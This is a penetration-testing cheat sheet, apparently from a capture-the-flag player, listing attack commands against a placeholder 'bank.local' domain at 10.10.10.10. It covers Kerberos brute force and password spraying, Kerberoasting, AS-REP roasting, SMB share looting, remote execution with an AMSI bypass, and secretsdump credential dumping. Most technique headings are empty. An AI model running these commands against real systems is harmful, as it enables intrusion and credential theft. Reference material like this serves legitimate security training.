# EzpzCheatSheet
This CheatSheet will not have much explanation. It just a commands that has been used pwning all of the machines from various platform and something that I have encounter before.

# A. Ports

### 25 (SMTP)

### 53 (DNS)

### 88 (Kerberos)

```bash
# Nmap


# Enumerate Users
kerbrute userenum -d bank.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Bruteforce User
kerbrute bruteuser -d bank.local --dc 10.10.10.10 rockyou.txt nik

# Passwword Spray
kerbrute passwordspray -d bank.local --dc 10.10.10.10 user.txt 'Password@123!'

# Kerberoasting
GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt

# bloodhound-python
bloodhound-python -u 'nik' -p 'Password@123!' -d 'bank.locall' -ns 10.10.10.10
```

### 110,995 (POP3)

### 135,593 (RPC)

```bash
# Nmap

# Rpcclient
rpcclient -U '' -N 10.10.10.10

# Rpcclient Commands
- enumdomusers
- netshareenum
- netshareenumall
- srvinfo
- queryuser 500
- querydispinfo
```

### 139,445 (SMB)

```bash
# Nmap
nmap --script "safe or smb-enum-\*" -p 445 10.10.10.10
nmap --script smb-vuln\* -p 137,139,445 10.10.10.10

# Smbmap
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u raj -p 123 
smbmap -H 10.10.10.10 -P 139

# Smbclient
smbclient -L 10.10.10.10
smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;mget \*"
smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;ls"
smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;mget \*" 'Password@123!'
smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;ls" 'Password@123!'

# Smbget
smbget -R smb://10.10.10.10/users$/nik/nik.xml -U 'nik'

# Crackmapexec
crackmapexec smb --gen-relay-list targets.txt 10.10.10.0/24
crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -X whoami --amsi-bypass /tmp/amsiibypass
crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -x whoami 

# Enum4linux
enum4linux 10.10.10.10
```

### 161,162 (SNMP - UDP)

### 636 (LDAP)

```bash
# Nmap
nmap -n -sV --script "ldap\* and not brute" 10.10.10.10

# LdapSearch
ldapsearch -h 10.10.10.10 -x -b 'DC=bank,DC=local' -s sub
ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=\*)'
ldapsearch -x -h 10.10.10.10 -D 'bank.local\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'

```

### 2049 (NFS MOUNT)

### 3128 (SQUID PROXY)

### 3306 (MYSQL)

### 3389 (RDP)

### 3632 (DISTCC)

### 6379 (REDIS)

### 27017,27018 (MONGODB)

# B. Tools/Techniques

### Port Knocking

### SQL Injection

### Hydra

### Wfuzz

### Ffuf

### Uploading Files

### Local File Inclusion (LFI)

### Remote Command Execution (RCE)

### Socat

### Chisel

### Ping Sweep

### Stegseek

### Binwalk

### Crunch

### PrivescCheck.ps1

### Windows-Exploit-Suggester 

### WebDav

### Threader3000

### Seatbelt.exe

### File Transfer

### Firefox Decrypt

### Sshuttle

### Pwsh

### Invoke-Mimikatz.ps1

### Rubeus

### Covenant

### Impacket Tools

```bash
# GetNPUsers.py
GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/' -no-pass -usersfile user.txt -format hashcat

# GetUserSPNs.py
GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt

# secretsdump.py
secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
```

# C. SUID/CAP/SUDO/GROUP

### LXD

### Node

### Cat

### Snap

### Msfconsole

### Docker

### Initctl

# D. Exploit/CVE/Abuse/Misconf

### ShellShock

### MS-17-010

### MS08-067

### SeImpersonatePrivilege

### MS11-046

### MS16-098

### MS10-059

### Token Kidnapping (Windows 2003)

### DirtySock

### ChrootKit

### IIS 6.0 (CVE-2017-7269)

### AlwaysInstall Elevated

### Ptrace

### FTP Backdoor Command Execution

### Shadow Writable

### OpenSMPTD < 6 (Local Privesc)

### PHP Info + LFI

### DirtyCow

### Ubuntu

# E. CMS/Web

### Wordpress

### NibbleBlog

### HTTPFileServer

### Drupal

### Elastix

### CMS Made Simple

### Umbraco

### ThinVNC

### Voting System

### Osticket

# F. Reverse Shell

### PowerShell

```powershell
# ConPtyShell (Interactive Powershell)

```